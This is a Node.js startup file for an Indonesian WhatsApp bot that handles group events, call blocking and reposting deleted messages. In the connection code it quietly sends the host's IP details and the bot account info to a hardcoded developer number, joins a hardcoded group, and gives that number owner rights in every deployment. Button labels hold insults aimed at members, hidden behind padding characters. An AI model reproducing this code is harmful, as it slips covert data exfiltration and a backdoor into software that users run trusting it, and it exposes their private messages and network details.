const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, WAMessageProto, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const denz = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./denz.js', module => console.log(color('Wanz :'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [ 2, 2143, 3 ]
    denz.logger.level = 'warn'
    denz.browserDescription = ['Wanz Botz','Desktop','3.0']
    await sleep(7000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('Wanz :'), color('Scan Kodenya bang', 'red'))
    })
    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
    
    denz.on('credentials-updated', () => {
        console.log(color('Wanz :'), color('credentials updated!', 'cyan'))
        })
     
      await denz.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/Ifk2ChQiGoTEHq0go90V7N`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('Wanz', 'yellow'), color('Bergabung ke Grup Official Wanz Botz', 'cyan'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer denz Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/icon.jpg'),sourceUrl:"https://wa.me/6287828930441?text=Assalamualaikum"}}})
	console.log(color('Wanz', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("6287828930441@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer denz Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/icon.jpg'),sourceUrl:"https://wa.me/6287828930441?text=Assalamualaikum"}}})
     console.log(color('Wanz', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })
      
    denz.on('connecting', () => {
		console.log(color('Wanz :'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
		})
	
	denz.on('open', () => {
	console.log(color('Wanz :'), color('Connected, Ketik .menu di Whatsapp..!!', 'cyan'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('Wanz :'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    denz.on('close', async () => {
        console.log(color('Wanz :'), color('Disconnected.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   denz.on('chat-update', async (mek) => {
        require('./denz.js')(denz, mek)
        ownerNumber = ["6287828930441@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6287828930441@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        denz.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			const mdata = await denz.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6287828930441:6287828930441\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
		    //Button ocument
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = 
sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await denz.prepareMessage(media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
						masuk =`Eh ads Member baru nih..\nHalo @${num.split('@')[0]}`
		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*AKU MAU KASIH TAU KALAU AKU ITU ANAK HASIL ZINA*`}, type: 1}]
			const masukan = {
    contentText: `${masuk}`,
    footerText: `Selamat Datang di › ${mdata.subject}\nKlik Oke Untuk Melanjutkan`,
    buttons: bumess,
    headerType: 1
}
			denz.sendMessage(mdata.id, masukan, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/denz'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/icon.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}})
			} else if (anu.action == 'remove') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6287828930441:6287828930441\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluarkan =`Yahh, ada yang keluar 😭\nSelamat tinggal @${num.split('@')[0]}\nSemoga gak jadi beban lagi disini :v`
		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nDia Pacarku guys, Kita Ngegay udah lama, gak tau kenapa tiba2 Keluar grup 😭'}, type: 1}]
			const Keluarlah = {
    contentText: `${keluarkan}`,
    footerText: `Beban Grup › ${mdata.subject}`,
    buttons: bumesss,
    headerType: 1
}
			denz.sendMessage(mdata.id, Keluarlah, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/denz'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/icon.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6287828930441:6287828930441\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*P R O M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nSelamat Yah atas Kenaikan Pangkatnya 🔥`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('Wanz :'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6287828930441:6287828930441\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*D E M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nMamposs Nggak jadi Admin lagi, mangkanya yg Becuss..!!`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('Wanz :'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	denz.on('group-update', async (anu) => {
		const metdata = await denz.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6287828930441:6287828930441\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Horee.. Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('Wanz :'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ GRUP CLOSED ] -\n\n_Yahh..Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('Wanz :'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('Wanz :'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('Wanz :'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('Wanz :'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

denz.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/icon.jpg'),sourceUrl:`https://wa.me/6287828930441?text=Assalamualaikum`}}})
        await sleep(5000)
        await denz.blockUser(callerId, "add")
        })
        
	denz.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe && antidelete)
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = denz.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = denz.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
denzdelete = `*「 PESAN DITARIK TERDETEKSI 」*
› Dari : *@${m.participant.split("@")[0]}*
› Waktu : ${jam}
› Tanggal : ${calender}`
button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nYahh gpp Sumpah , fiturnya sangat membantu para pelaku Penjahat Kelamin :)'}, type: 1}]
const buMess = {
    contentText: `${denzdelete}`,
    footerText: 'Anti Delete › Pesan ini telah di hapus',
    buttons: button,
    headerType: 1
}
denz.sendMessage(m.key.remoteJid, buMess, MessageType.buttonsMessage, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
denz.copyNForward(m.key.remoteJid, m.message)
})
}
console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Subcribe : Wanz Botz', 'red'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 70 + Math.random() * 100 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 50,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Wanz Botz' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading cuyy' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()